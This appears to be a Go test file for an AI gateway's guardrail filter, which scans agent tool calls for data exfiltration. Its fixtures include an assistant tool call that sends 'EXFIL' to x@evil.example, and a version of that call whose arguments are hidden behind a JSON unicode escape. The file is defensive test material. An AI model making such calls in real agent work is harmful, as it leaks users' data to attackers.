package scripting

import (
	"fmt"
	"reflect"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/TykTechnologies/midsommar/v2/guardrails"
	"github.com/TykTechnologies/midsommar/v2/models"
	"github.com/TykTechnologies/midsommar/v2/third_party/langchaingo/llms"
)

// An agent conversation in the OpenAI format with two tool calls, one of
// which sends data out.
const openAIToolCallBody = `{"model":"m","messages":[
	{"role":"system","content":"You are a mail assistant."},
	{"role":"user","content":"Summarise my inbox"},
	{"role":"assistant","content":null,"tool_calls":[
		{"id":"c1","type":"function","function":{"name":"read_inbox","arguments":"{}"}},
		{"id":"c2","type":"function","function":{"name":"send_email","arguments":"{\"to\":\"x@evil.example\",\"body\":\"EXFIL\"}"}}]},
	{"role":"tool","tool_call_id":"c1","content":"3 messages"},
	{"role":"tool","tool_call_id":"c2","content":"sent"}]}`

// exfilProvider flags any text with EXFIL in it.
func exfilProvider(caps guardrails.Capabilities) *fakeProvider {
	return &fakeProvider{caps: caps, verdict: func(in guardrails.Input) guardrails.Verdict {
		v := guardrails.Verdict{}
		for _, s := range in.Segments {
			if strings.Contains(s.Text, "EXFIL") {
				v.Flagged = true
				v.Findings = append(v.Findings, guardrails.Finding{Detector: "exfil", Category: "injection", Score: 0.9, Severity: "critical", SegmentIndex: s.Index})
			}
		}
		return v
	}}
}

var toolCallFilterSeq atomic.Uint32

// toolCallFilter is a saved guardrail version (so the verdict cache applies)
// using p, with extra merged into its config.
func toolCallFilter(t *testing.T, p *fakeProvider, onDetect string, extra map[string]any) *models.Filter {
	t.Helper()
	id := toolCallFilterSeq.Add(1)
	cfg := installFake(t, fmt.Sprintf("fake_tool_calls_%d", id), p, onDetect)
	delete(cfg, "cache")
	for k, v := range extra {
		cfg[k] = v
	}
	f := guardrailFilter("tool-calls", false, cfg)
	f.ID, f.UpdatedAt = uint(20000+id), time.Now()
	return f
}

func runOpenAI(t *testing.T, f *models.Filter, body string) *ScriptOutput {
	t.Helper()
	out, err := NewFilterRunner(f).RunScript(&ScriptInput{RawInput: body, Format: "openai", VendorName: "openai", Context: map[string]interface{}{"app_id": int64(7)}}, nil)
	if err != nil {
		t.Fatalf("RunScript() error = %v", err)
	}
	return out
}

// With tool-call scanning off (the default) the provider is sent exactly
// what it was sent before tool calls were segments.
func TestGuardrailToolCalls_OffByDefault(t *testing.T) {
	for _, scope := range []string{guardrails.ScopeAllUser, guardrails.ScopeAllMessages} {
		for _, toolResults := range []bool{true, false} {
			before := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
			f := toolCallFilter(t, before, guardrails.ActionBlock, map[string]any{"scope": scope, "tool_results": map[string]any{"scan": toolResults}})
			out := runOpenAI(t, f, openAIToolCallBody)
			if out.Block {
				t.Errorf("%s/%v: blocked on a tool call with scanning off", scope, toolResults)
			}
			off := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
			f = toolCallFilter(t, off, guardrails.ActionBlock, map[string]any{"scope": scope, "tool_results": map[string]any{"scan": toolResults}, "tool_calls": map[string]any{"scan": false}})
			runOpenAI(t, f, openAIToolCallBody)
			if !reflect.DeepEqual(sawTexts(before), sawTexts(off)) {
				t.Errorf("%s/%v: explicit scan:false differs from the default", scope, toolResults)
			}
			for _, s := range before.seen() {
				if s.Kind == guardrails.KindToolCall || s.Context != nil || strings.Contains(s.Text, "send_email") || strings.Contains(s.Text, "EXFIL") {
					t.Errorf("%s/%v: provider was sent a tool call: %+v", scope, toolResults, s)
				}
			}
		}
	}
}

// With it on, each call is a segment of kind tool_call with the tool's name,
// the call id and its goal, and a flagged one blocks.
func TestGuardrailToolCalls_ScanBlocks(t *testing.T) {
	p := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
	f := toolCallFilter(t, p, guardrails.ActionLog, map[string]any{"tool_calls": map[string]any{"scan": true, "on_detect": "block"}})
	out := runOpenAI(t, f, openAIToolCallBody)
	if !out.Block {
		t.Fatalf("a flagged tool call did not block: %+v", out)
	}
	var calls []guardrails.Segment
	for _, s := range p.seen() {
		if s.Kind == guardrails.KindToolCall {
			calls = append(calls, s)
		}
	}
	if len(calls) < 2 {
		t.Fatalf("tool call segments = %+v", calls)
	}
	byName := map[string]guardrails.Segment{}
	for _, c := range calls {
		if _, dup := byName[c.ToolName]; !dup {
			byName[c.ToolName] = c
		}
	}
	send := byName["send_email"]
	if send.Role != guardrails.RoleAssistant || send.ToolCallID != "c2" || send.Text != `{"to":"x@evil.example","body":"EXFIL"}` {
		t.Errorf("send_email segment = %+v", send)
	}
	if send.Context == nil || send.Context.UserGoal != "Summarise my inbox" || send.Context.System != "" {
		t.Errorf("context = %+v (the system prompt is sent only with include_system)", send.Context)
	}
	ev := out.ComplianceEvents
	if len(ev) == 0 || ev[0].Metadata["action"] != guardrails.ActionBlock || !reflect.DeepEqual(ev[0].Metadata["kinds"], []string{guardrails.KindToolCall}) || !reflect.DeepEqual(ev[0].Metadata["tool_names"], []string{"send_email"}) {
		t.Errorf("events = %+v", ev)
	}
	// Tool calls never share a call with the user's text or tool results.
	for _, in := range p.ins {
		classes := map[int]bool{}
		for _, s := range in.Segments {
			classes[trustClass(s)] = true
		}
		if len(classes) > 1 {
			t.Errorf("a call mixed trust classes: %+v", in.Segments)
		}
	}
}

// include_system adds the system prompt; a provider that does not ask for
// the goal never gets any; one without ToolSegments gets plain assistant
// text.
func TestGuardrailToolCalls_Context(t *testing.T) {
	p := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
	runOpenAI(t, toolCallFilter(t, p, guardrails.ActionLog, map[string]any{"tool_calls": map[string]any{"scan": true, "include_system": true}}), openAIToolCallBody)
	found := false
	for _, s := range p.seen() {
		if s.Kind == guardrails.KindToolCall {
			found = true
			if s.Context == nil || s.Context.System != "You are a mail assistant." {
				t.Errorf("include_system: context = %+v", s.Context)
			}
		}
		if s.Kind != guardrails.KindToolCall && s.Context != nil {
			t.Errorf("a %s segment carries a context", s.Kind)
		}
	}
	if !found {
		t.Fatal("no tool call segment")
	}

	noGoal := exfilProvider(guardrails.Capabilities{ToolSegments: true})
	runOpenAI(t, toolCallFilter(t, noGoal, guardrails.ActionLog, map[string]any{"tool_calls": map[string]any{"scan": true, "include_system": true}}), openAIToolCallBody)
	for _, s := range noGoal.seen() {
		if s.Context != nil {
			t.Errorf("provider without WantsGoal got a context: %+v", s)
		}
	}

	plain := exfilProvider(guardrails.Capabilities{})
	out := runOpenAI(t, toolCallFilter(t, plain, guardrails.ActionLog, map[string]any{"tool_calls": map[string]any{"scan": true}}), openAIToolCallBody)
	sawCall := false
	for _, s := range plain.seen() {
		if strings.Contains(s.Text, "EXFIL") {
			sawCall = true
			if s.Role != guardrails.RoleAssistant || s.Kind != "" || s.ToolName != "" {
				t.Errorf("provider without ToolSegments got %+v", s)
			}
		}
	}
	if !sawCall || out.Block {
		t.Errorf("plain provider: saw call %v, blocked %v (on_detect log)", sawCall, out.Block)
	}
}

// The default action follows the filter's: block stays block, anything that
// cannot apply to a call (log, redact, quarantine) is log.
func TestGuardrailToolCalls_DefaultAction(t *testing.T) {
	for onDetect, wantBlock := range map[string]bool{guardrails.ActionBlock: true, guardrails.ActionLog: false, guardrails.ActionRedact: false, guardrails.ActionQuarantine: false} {
		p := exfilProvider(guardrails.Capabilities{ToolSegments: true, Redacts: true})
		out := runOpenAI(t, toolCallFilter(t, p, onDetect, map[string]any{"tool_calls": map[string]any{"scan": true}}), openAIToolCallBody)
		if out.Block != wantBlock {
			t.Errorf("on_detect %s: block = %v, want %v", onDetect, out.Block, wantBlock)
		}
		if !wantBlock && out.Payload != openAIToolCallBody {
			t.Errorf("on_detect %s: the body was rewritten for a tool call", onDetect)
		}
	}
	if _, err := guardrails.Normalize(guardrails.Config{Provider: guardrails.ProviderBuiltin, Detectors: []guardrails.DetectorConfig{{Name: "injection"}}, OnDetect: "log", ToolCalls: guardrails.ToolCalls{OnDetect: "quarantine"}}, false); err == nil {
		t.Error("tool_calls.on_detect quarantine was accepted")
	}
}

// The verdict cache keys a tool call on its goal: the same arguments under
// another goal are scanned again, the same under the same goal are not.
func TestGuardrailToolCalls_CacheKeysOnContext(t *testing.T) {
	freshVerdictCache(t, time.Hour)
	p := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
	f := toolCallFilter(t, p, guardrails.ActionLog, map[string]any{"tool_calls": map[string]any{"scan": true}})
	countCalls := func() int {
		n := 0
		for _, s := range p.seen() {
			if s.Kind == guardrails.KindToolCall {
				n++
			}
		}
		return n
	}
	runOpenAI(t, f, openAIToolCallBody)
	first := countCalls()
	runOpenAI(t, f, openAIToolCallBody)
	if countCalls() != first {
		t.Errorf("a resent tool call was scanned again: %d then %d", first, countCalls())
	}
	other := strings.Replace(openAIToolCallBody, "Summarise my inbox", "Delete my inbox", 1)
	runOpenAI(t, f, other)
	if countCalls() == first {
		t.Error("the same arguments under another goal hit the cache")
	}
}

// Responses API requests: function_call items are tool calls when scanned,
// assistant text (under all_messages) otherwise.
func TestGuardrailToolCalls_ResponsesMessages(t *testing.T) {
	msgs := []llms.MessageContent{
		systemMsg("sys"),
		userMsg("book a flight"),
		{Role: llms.ChatMessageTypeAI, Parts: []llms.ContentPart{llms.TextPart(`{"card":"EXFIL"}`)}},
		{Role: llms.ChatMessageTypeTool, Parts: []llms.ContentPart{llms.TextPart("booked")}},
	}
	tools := []MessageTool{{}, {}, {Name: "pay", CallID: "fc_1", Call: true}, {Name: "pay", CallID: "fc_1"}}
	run := func(cfg map[string]any) *fakeProvider {
		p := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
		f := toolCallFilter(t, p, guardrails.ActionLog, cfg)
		if _, err := NewFilterRunner(f).RunScript(&ScriptInput{RawInput: "{}", Format: "openai_responses", Messages: msgs, MessageTools: tools}, nil); err != nil {
			t.Fatal(err)
		}
		return p
	}
	on := run(map[string]any{"tool_calls": map[string]any{"scan": true}})
	var call *guardrails.Segment
	for _, s := range on.seen() {
		if s.Kind == guardrails.KindToolCall {
			s := s
			call = &s
		}
	}
	if call == nil || call.ToolName != "pay" || call.ToolCallID != "fc_1" || call.Context == nil || call.Context.UserGoal != "book a flight" {
		t.Fatalf("Responses tool call segment = %+v", call)
	}
	off := run(map[string]any{"scope": guardrails.ScopeAllMessages})
	for _, s := range off.seen() {
		if s.Kind == guardrails.KindToolCall || s.Context != nil {
			t.Errorf("scan off: %+v", s)
		}
	}
	if !reflect.DeepEqual(sawTexts(off), sortedTexts([]string{"sys", "book a flight", `{"card":"EXFIL"}`, "booked"})) {
		t.Errorf("scan off under all_messages sent %q", sawTexts(off))
	}
}

// A buffered response's tool calls are screened with the request's goal,
// and a flagged one blocks the response.
func TestGuardrailToolCalls_BufferedResponse(t *testing.T) {
	p := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
	cfg := installFake(t, "fake_tool_calls_response", p, guardrails.ActionBlock)
	cfg["tool_calls"] = map[string]any{"scan": true}
	f := guardrailFilter("resp", true, cfg)
	resp := `{"choices":[{"message":{"role":"assistant","content":"Sending now","tool_calls":[{"id":"c9","type":"function","function":{"name":"send_email","arguments":"{\"body\":\"EXFIL\"}"}}]}}]}`
	req := `{"messages":[{"role":"user","content":"tidy my inbox"}]}`
	out, err := NewFilterRunner(f).RunScript(&ScriptInput{
		RawInput: "Sending now", IsResponse: true,
		ResponseBody: resp, ResponseFormat: "openai", RequestBody: req,
	}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !out.Block {
		t.Fatalf("flagged response tool call not blocked: %+v", out)
	}
	var call guardrails.Segment
	for _, s := range p.seen() {
		if s.Kind == guardrails.KindToolCall {
			call = s
		}
	}
	if call.ToolName != "send_email" || call.Context == nil || call.Context.UserGoal != "tidy my inbox" {
		t.Errorf("response tool call segment = %+v", call)
	}

	// Scan off: only the text, as before.
	p2 := exfilProvider(guardrails.Capabilities{ToolSegments: true, WantsGoal: true})
	cfg2 := installFake(t, "fake_tool_calls_response_off", p2, guardrails.ActionBlock)
	out, err = NewFilterRunner(guardrailFilter("resp-off", true, cfg2)).RunScript(&ScriptInput{
		RawInput: "Sending now", IsResponse: true, ResponseBody: resp, ResponseFormat: "openai", RequestBody: req,
	}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if out.Block || !reflect.DeepEqual(sawTexts(p2), []string{"Sending now"}) {
		t.Errorf("scan off: block %v, provider saw %q", out.Block, sawTexts(p2))
	}

	// A chunk never reads the body: streams are held elsewhere.
	p3 := exfilProvider(guardrails.Capabilities{ToolSegments: true})
	cfg3 := installFake(t, "fake_tool_calls_response_chunk", p3, guardrails.ActionBlock)
	cfg3["tool_calls"] = map[string]any{"scan": true}
	out, err = NewFilterRunner(guardrailFilter("resp-chunk", true, cfg3)).RunScript(&ScriptInput{
		RawInput: "x", CurrentBuffer: "x", IsResponse: true, IsChunk: true, IsFinal: true, ResponseBody: resp, ResponseFormat: "openai",
	}, nil)
	if err != nil || out.Block {
		t.Errorf("chunk: block %v err %v", out.Block, err)
	}
}

// A tool call hidden behind JSON escapes is seen through the decoded view.
func TestGuardrailToolCalls_DecodedView(t *testing.T) {
	body := `{"messages":[{"role":"user","content":"hi"},{"role":"assistant","tool_calls":[{"id":"c1","function":{"name":"post","arguments":"{\"b\":\"\\u0045XFIL\"}"}}]}]}`
	p := exfilProvider(guardrails.Capabilities{ToolSegments: true})
	out := runOpenAI(t, toolCallFilter(t, p, guardrails.ActionLog, map[string]any{"tool_calls": map[string]any{"scan": true, "on_detect": "block"}}), body)
	if !out.Block {
		t.Fatalf("escaped arguments not caught: %q", sawTexts(p))
	}
}
